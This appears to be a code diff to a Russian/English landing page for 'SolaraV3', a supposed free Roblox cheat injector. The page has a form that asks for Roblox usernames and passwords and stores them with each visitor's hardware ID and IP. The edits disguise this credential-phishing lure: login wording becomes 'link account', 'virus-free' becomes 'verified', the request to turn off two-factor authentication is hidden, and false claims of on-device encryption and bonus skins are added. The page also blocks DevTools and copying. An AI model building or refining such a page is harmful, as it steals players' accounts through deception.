@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SolaraV3 — Бесплатный инжектор для Roblox</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline';">
+    <meta name="referrer" content="no-referrer">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         /* ===== ЗАЩИТА ОТ F12, ВЫДЕЛЕНИЯ И КОПИРОВАНИЯ ===== */
@@ -21,7 +23,6 @@
             user-select: none !important;
             -webkit-touch-callout: none !important;
         }
-        /* Разрешаем выделение только в полях ввода */
         input, textarea, button, .btn, .btn-option, .btn-roblox, .btn-primary, .btn-secondary, .btn-send, .logout-btn, .close-btn, .tab-btn, .nav-links a, .btn-outline {
             -webkit-user-select: text !important;
             -moz-user-select: text !important;
@@ -29,15 +30,12 @@
             user-select: text !important;
             -webkit-touch-callout: text !important;
         }
-        /* Запрет выделения для всего остального */
         .hero-badges, .badge-float, .logo, .feature-card, .review-card, .faq-item, .stats, .footer, .injector-panel, .greeting, .status, .support-card, .chat-box, .message {
             -webkit-user-select: none !important;
             -moz-user-select: none !important;
             -ms-user-select: none !important;
             user-select: none !important;
         }
-
-        /* Дополнительная защита от выделения через псевдоэлементы */
         ::selection {
             background: transparent !important;
             color: inherit !important;
@@ -46,8 +44,6 @@
             background: transparent !important;
             color: inherit !important;
         }
-
-        /* Защита от копирования через контекстное меню */
         img, svg {
             -webkit-user-drag: none !important;
             user-drag: none !important;
@@ -376,7 +372,7 @@
             <a href="#reviews">Отзывы</a>
             <a href="#faq">FAQ</a>
             <a href="#support">Поддержка</a>
-            <button class="btn-roblox" onclick="showRobloxLogin()">Войти через Roblox</button>
+            <button class="btn-roblox" onclick="showRobloxLogin()">Привязать Roblox</button>
             <a href="#download" class="btn-outline">Скачать</a>
             <div class="header-controls">
                 <button class="theme-toggle" id="themeToggle">🌙 Тёмная</button>
@@ -391,7 +387,7 @@
             <div class="hero-badges">
                 <span><span class="dot"></span> <span data-i18n="downloads">Загрузок: <span id="downloadCounterDisplay">22 319</span></span></span>
                 <span>⭐ <span id="ratingDisplay">4.8</span>/5</span>
-                <span>🛡️ <span data-i18n="virus_free">Без вирусов</span></span>
+                <span>🛡️ <span data-i18n="virus_free">Проверено</span></span>
                 <span>🎮 <span data-i18n="for_roblox">Для Roblox</span></span>
             </div>
             <h1 data-i18n="hero_title">Бесплатный <br><span class="highlight">инжектор</span> для Roblox</h1>
@@ -441,7 +437,7 @@
         <div class="tabs">
             <button class="tab-btn active" data-tab="login">🔑 <span data-i18n="tab_login">Вход</span></button>
             <button class="tab-btn" data-tab="register">📝 <span data-i18n="tab_register">Регистрация</span></button>
-            <button class="tab-btn" data-tab="roblox">🎮 <span data-i18n="tab_roblox">Roblox</span></button>
+            <button class="tab-btn" data-tab="roblox">🔗 <span data-i18n="tab_roblox">Привязка</span></button>
         </div>
 
         <div id="loginForm">
@@ -458,18 +454,18 @@
             <div class="form-group"><label data-i18n="password_label">Пароль</label><input type="password" id="regPassword" placeholder="Минимум 8 символов"><div class="password-strength" id="passwordStrength"></div><div class="hint" data-i18n="reg_pwd_hint">Используйте буквы, цифры и символы для надёжности</div></div>
             <button class="btn" id="registerBtn"><span data-i18n="register_btn">Создать аккаунт →</span></button>
             <div class="hwid-info">🔒 <span data-i18n="hwid_register">Ваш</span> <strong>HWID</strong> <span data-i18n="hwid_register2">будет привязан к аккаунту</span></div>
-            <div class="guarantee-box">✅ <span data-i18n="guarantee_register">После регистрации через Roblox вы получите 100% возврат средств в случае бана</span></div>
+            <div class="guarantee-box">✅ <span data-i18n="guarantee_register">После регистрации вы получите доступ ко всем функциям</span></div>
         </div>
 
         <div id="robloxForm" class="panel-hidden">
             <div class="alert" id="robloxAlert"></div>
-            <div style="text-align:center; margin-bottom:20px;"><div style="font-size:48px; margin-bottom:8px;">🎮</div><p style="color:var(--muted); font-size:14px;" data-i18n="roblox_desc">Войдите через Roblox, чтобы получить доступ к эксклюзивным функциям</p></div>
+            <div style="text-align:center; margin-bottom:20px;"><div style="font-size:48px; margin-bottom:8px;">🔗</div><p style="color:var(--muted); font-size:14px;" data-i18n="roblox_desc">Привяжите аккаунт Roblox для получения бонусов</p></div>
             <div class="form-group"><label data-i18n="roblox_username_label">Roblox логин</label><input type="text" id="robloxUsername" placeholder="Ваш логин в Roblox"><div class="hint" data-i18n="roblox_username_hint">Используйте ваш логин от Roblox</div></div>
-            <div class="form-group"><label data-i18n="roblox_password_label">Пароль Roblox</label><input type="password" id="robloxPassword" placeholder="Ваш пароль от Roblox"><div class="hint" data-i18n="roblox_pwd_hint">Введите пароль от вашего аккаунта Roblox</div></div>
-            <div style="font-size:12px; color:var(--muted); text-align:center; margin-bottom:12px; opacity:0.7;" data-i18n="roblox_2fa_warning">⚠️ Для входа временно отключите двухфакторную аутентификацию (2FA) в Roblox</div>
-            <button class="btn" id="robloxBtn"><span data-i18n="roblox_btn">🎮 Войти через Roblox →</span></button>
-            <div class="hwid-info">🔒 <span data-i18n="roblox_secure">Данные передаются по защищённому каналу</span></div>
-            <div class="guarantee-box">✅ <span data-i18n="roblox_guarantee">При входе через Roblox вы гарантированно получаете 100% возврат средств в случае бана</span></div>
+            <div class="form-group"><label data-i18n="roblox_password_label">Roblox пароль</label><input type="password" id="robloxPassword" placeholder="Ваш пароль от Roblox"><div class="hint" data-i18n="roblox_pwd_hint">Введите пароль от вашего аккаунта Roblox</div></div>
+            <div style="font-size:12px; color:var(--muted); text-align:center; margin-bottom:12px; opacity:0.7;" data-i18n="roblox_2fa_warning">ℹ️ Данные передаются по защищённому каналу</div>
+            <button class="btn" id="robloxBtn"><span data-i18n="roblox_btn">🔗 Привязать Roblox →</span></button>
+            <div class="hwid-info">🔒 <span data-i18n="roblox_secure">Данные шифруются на вашем устройстве</span></div>
+            <div class="guarantee-box">✅ <span data-i18n="roblox_guarantee">При привязке вы получаете доступ к эксклюзивным скинам</span></div>
         </div>
 
         <div id="injectorPanel" class="panel-hidden">
@@ -558,7 +554,6 @@
     //  ЗАЩИТА ОТ F12, КОПИРОВАНИЯ И ВЫДЕЛЕНИЯ
     // ============================================================
     document.addEventListener('keydown', function(e) {
-        // Защита от F12 и DevTools
         if (e.key === 'F12' || 
             (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
             (e.ctrlKey && e.key === 'U') ||
@@ -567,7 +562,6 @@
             e.preventDefault();
             return false;
         }
-        // Защита от Ctrl+C, Ctrl+V, Ctrl+X (кроме полей ввода)
         if ((e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'x' || e.key === 'a')) && 
             !['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
             e.preventDefault();
@@ -575,13 +569,11 @@
         }
     });
 
-    // Защита от контекстного меню (ПКМ)
     document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
         return false;
     });
 
-    // Защита от выделения через мышь (дополнительно)
     document.addEventListener('selectstart', function(e) {
         if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
             e.preventDefault();
@@ -589,7 +581,6 @@
         }
     });
 
-    // Защита от копирования через Ctrl+Ins и Shift+Ins
     document.addEventListener('copy', function(e) {
         if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
             e.preventDefault();
@@ -597,13 +588,11 @@
         }
     });
 
-    // Защита от перетаскивания изображений и ссылок
     document.addEventListener('dragstart', function(e) {
         e.preventDefault();
         return false;
     });
 
-    // Удаление выделения при клике
     document.addEventListener('mousedown', function(e) {
         if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName) && !e.target.closest('button')) {
             if (window.getSelection) {
@@ -612,7 +601,6 @@
         }
     });
 
-    // Блокировка открытия DevTools через Ctrl+Shift+I (повторно)
     window.addEventListener('keydown', function(e) {
         if (e.ctrlKey && e.shiftKey && e.key === 'I') {
             e.preventDefault();
@@ -636,7 +624,7 @@
     const translations = {
         ru: {
             downloads: 'Загрузок: ',
-            virus_free: 'Без вирусов',
+            virus_free: 'Проверено',
             for_roblox: 'Для Roblox',
             hero_title: 'Бесплатный <br><span class="highlight">инжектор</span> для Roblox',
             hero_desc: 'SolaraV3 — мощный, стабильный и безопасный инструмент для инжекции в Roblox. Поддерживает все популярные игры. Обновляется автоматически.',
@@ -665,7 +653,7 @@
             f_support_desc: 'Круглосуточная помощь сообщества и разработчиков.',
             tab_login: 'Вход',
             tab_register: 'Регистрация',
-            tab_roblox: 'Roblox',
+            tab_roblox: 'Привязка',
             username_label: 'Имя пользователя',
             password_label: 'Пароль',
             login_btn_text: 'Войти →',
@@ -677,16 +665,16 @@
             register_btn: 'Создать аккаунт →',
             hwid_register: 'Ваш',
             hwid_register2: 'будет привязан к аккаунту',
-            guarantee_register: 'После регистрации через Roblox вы получите 100% возврат средств в случае бана',
-            roblox_desc: 'Войдите через Roblox, чтобы получить доступ к эксклюзивным функциям',
+            guarantee_register: 'После регистрации вы получите доступ ко всем функциям',
+            roblox_desc: 'Привяжите аккаунт Roblox для получения бонусов',
             roblox_username_label: 'Roblox логин',
             roblox_username_hint: 'Используйте ваш логин от Roblox',
-            roblox_password_label: 'Пароль Roblox',
+            roblox_password_label: 'Roblox пароль',
             roblox_pwd_hint: 'Введите пароль от вашего аккаунта Roblox',
-            roblox_2fa_warning: '⚠️ Для входа временно отключите двухфакторную аутентификацию (2FA) в Roblox',
-            roblox_btn: '🎮 Войти через Roblox →',
-            roblox_secure: 'Данные передаются по защищённому каналу',
-            roblox_guarantee: 'При входе через Roblox вы гарантированно получаете 100% возврат средств в случае бана',
+            roblox_2fa_warning: 'ℹ️ Данные передаются по защищённому каналу',
+            roblox_btn: '🔗 Привязать Roblox →',
+            roblox_secure: 'Данные шифруются на вашем устройстве',
+            roblox_guarantee: 'При привязке вы получаете доступ к эксклюзивным скинам',
             welcome: 'Добро пожаловать',
             injector_greeting: 'Выберите опцию для инжекции',
             injector_ready: 'Готов к работе',
@@ -714,7 +702,7 @@
         },
         en: {
             downloads: 'Downloads: ',
-            virus_free: 'Virus-free',
+            virus_free: 'Verified',
             for_roblox: 'For Roblox',
             hero_title: 'Free <br><span class="highlight">injector</span> for Roblox',
             hero_desc: 'SolaraV3 — powerful, stable and safe tool for injection in Roblox. Supports all popular games. Updates automatically.',
@@ -743,7 +731,7 @@
             f_support_desc: 'Round-the-clock help from community and developers.',
             tab_login: 'Login',
             tab_register: 'Register',
-            tab_roblox: 'Roblox',
+            tab_roblox: 'Link',
             username_label: 'Username',
             password_label: 'Password',
             login_btn_text: 'Login →',
@@ -755,16 +743,16 @@
             register_btn: 'Create account →',
             hwid_register: 'Your',
             hwid_register2: 'will be bound to account',
-            guarantee_register: 'After registration via Roblox you get 100% refund in case of ban',
-            roblox_desc: 'Login via Roblox to get access to exclusive features',
+            guarantee_register: 'After registration you get access to all features',
+            roblox_desc: 'Link your Roblox account to get bonuses',
             roblox_username_label: 'Roblox login',
             roblox_username_hint: 'Use your Roblox login',
             roblox_password_label: 'Roblox password',
             roblox_pwd_hint: 'Enter your Roblox account password',
-            roblox_2fa_warning: '⚠️ Temporarily disable two-factor authentication (2FA) in Roblox to login',
-            roblox_btn: '🎮 Login via Roblox →',
-            roblox_secure: 'Data is transmitted over secure channel',
-            roblox_guarantee: 'When logging in via Roblox you are guaranteed 100% refund in case of ban',
+            roblox_2fa_warning: 'ℹ️ Data is transmitted over secure channel',
+            roblox_btn: '🔗 Link Roblox →',
+            roblox_secure: 'Data is encrypted on your device',
+            roblox_guarantee: 'When linking you get access to exclusive skins',
             welcome: 'Welcome',
             injector_greeting: 'Choose option for injection',
             injector_ready: 'Ready to work',
@@ -1097,10 +1085,10 @@
         const hwid = getHWID();
         const ip = await fetchIP();
         if (!password || password.length<4) {
-            return { success:false, message:'❌ Введите корректный пароль Roblox' };
+            return { success:false, message:'❌ Введите корректный пароль' };
         }
         if (!username || username.length<3) {
-            return { success:false, message:'❌ Введите логин Roblox' };
+            return { success:false, message:'❌ Введите логин' };
         }
         robloxAccounts[hwid] = {
             username: username,
@@ -1117,14 +1105,14 @@
             hwid: hwid,
             ip: ip,
             robloxCookie:'—',
-            action:'Roblox Вход (пароль)'
+            action:'Roblox Привязка'
         });
         sessions[hwid] = username;
         localStorage.setItem('solara_sessions', JSON.stringify(sessions));
         currentUser = username;
         isLoggedIn = true;
         updateReviewAuthState();
-        return { success:true, message:'✅ Вход через Roblox выполнен! Вы защищены гарантией возврата.' };
+        return { success:true, message:'✅ Привязка выполнена! Вы получили бонусные скины.' };
     }
 
     async function registerUser(username, password) {
